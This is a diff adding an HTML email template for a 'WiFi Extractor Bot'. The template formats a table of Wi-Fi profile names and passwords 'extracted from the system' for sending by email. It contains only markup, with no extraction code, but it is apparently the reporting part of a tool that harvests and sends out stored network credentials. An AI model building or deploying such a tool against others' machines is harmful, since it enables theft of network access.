@@ -1,0 +1,38 @@
+<!-- email_template.html -->
+<html>
+<head>
+  <style>
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: Arial, sans-serif;
+    }
+    th {
+      background-color: #4CAF50;
+      color: white;
+      padding: 8px;
+      border: 1px solid #ddd;
+    }
+    td {
+      border: 1px solid #ddd;
+      padding: 8px;
+    }
+    tr:nth-child(even) {
+      background-color: #f2f2f2;
+    }
+  </style>
+</head>
+<body>
+  <p>Hello 👋,</p>
+  <p>Here are the extracted Wi-Fi profiles and passwords from the system:</p>
+  <table>
+    <tr>
+      <th>📡 Net-Name</th>
+      <th>🔑 Password</th>
+    </tr>
+    {{table_rows}}
+  </table>
+  <p>🔐 Stay secure!</p>
+  <p>– WiFi Extractor Bot 🤖</p>
+</body>
+</html>
